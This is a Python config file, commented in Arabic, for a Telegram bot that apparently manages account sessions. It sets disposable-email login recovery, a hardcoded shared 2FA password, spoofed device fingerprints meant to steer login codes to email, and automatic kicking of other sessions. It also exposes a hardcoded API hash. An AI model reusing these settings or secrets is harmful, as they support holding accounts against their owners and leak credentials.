# config.py
import os
from dotenv import load_dotenv

load_dotenv()

# قراءة التوكن مع تنظيفه من المسافات وعلامات التنصيص (مهم لـ Railway)
raw_token = os.getenv("BOT_TOKEN")
if not raw_token:
    raise ValueError("❌ خطأ: لم يتم العثور على BOT_TOKEN في متغيرات البيئة. تأكد من إضافته في Railway Variables باسم BOT_TOKEN")

BOT_TOKEN = raw_token.strip().strip('"').strip("'")
BOT_ID = BOT_TOKEN.split(":")[0]

API_ID = 37698652
API_HASH = "58b8a290e85dd6e57127270d937a1832"

REGISTRATION_LINK = os.getenv("REGISTRATION_LINK", "https://vimeo.com/1182266152?fl=pl&fe=cm")

# اسم قاعدة البيانات الافتراضي
DB_NAME = os.getenv("DB_NAME", "bot.db")

# --- Mail.tm (بريد Login) ---
MAILTM_API_BASE = "https://api.mail.tm"
EMAIL_MIGRATION_DELAY = 1.5

# إنعاش جلسة منتهية: انتظار ثم طلب كود عبر بريد Login (ثوانٍ)
SESSION_RECOVERY_DELAY = 300
# محاولات إنعاش قبل تصنيف «غير صالحة» + إعادة فحص الجلسات غير الصالحة
SESSION_RECOVERY_MAX_ATTEMPTS = 3
SESSION_RECOVERY_RETRY_DELAY = 300
INVALID_SESSION_RESCAN_INTERVAL = 900

# نظام الطرد التلقائي: فوراً → 24 ساعة → كل 5 دقائق حتى ينجح
AUTO_KICK_DELAY_24H = 86400
AUTO_KICK_DELAY_RETRY = 300

# كلمة مرور 2FA الافتراضية (تنظيف شامل + خط التأمين + الإنعاش)
DEFAULT_2FA_PASSWORD = "054321"

# بصمة جهاز (تقليل SentCodeTypeApp — يفضّل وصول الكود للبريد)
TELEGRAM_LANG_CODE = "en"
TELEGRAM_SYSTEM_LANG_CODE = "en-US"
TELEGRAM_DEVICE_PROFILES = [
    {
        "device_model": "POCO X3 Pro",
        "system_version": "SDK 33",
        "app_version": "10.14.5 (4658)",
        "lang_code": "en",
        "system_lang_code": "en-US",
    },
    {
        "device_model": "Samsung SM-S911B",
        "system_version": "SDK 34",
        "app_version": "11.4.2 (55192)",
        "lang_code": "en",
        "system_lang_code": "en-US",
    },
    {
        "device_model": "Redmi Note 12 Pro",
        "system_version": "SDK 33",
        "app_version": "10.13.4 (4512)",
        "lang_code": "en",
        "system_lang_code": "en-US",
    },
]

# إعادة إرسال كود الإنعاش حتى يصل كـ Email
RECOVERY_CODE_RESEND_ATTEMPTS = 18
RECOVERY_CODE_RESEND_INTERVAL = 4

# Watchdog: فحصان متتاليان فاشلان قبل إشعار «الجلسة توقفت»
WATCHDOG_DEAD_STREAK = 2

# السوبر أدمنز: لديهم كامل الصلاحيات (⭐ و Volume ورسائل المستخدمين وفحص الجلسات)
SUPER_ADMIN_IDS = [1873733722, 6566962493]
SUPER_ADMIN_ID = SUPER_ADMIN_IDS[0] # للمعالجة الخلفية المتوافقة

# قائمة جميع الأدمنز
ADMIN_IDS = [
    8357381411,
    6566962493,
    7343365087,
    8185311198,
    8114219256,
]
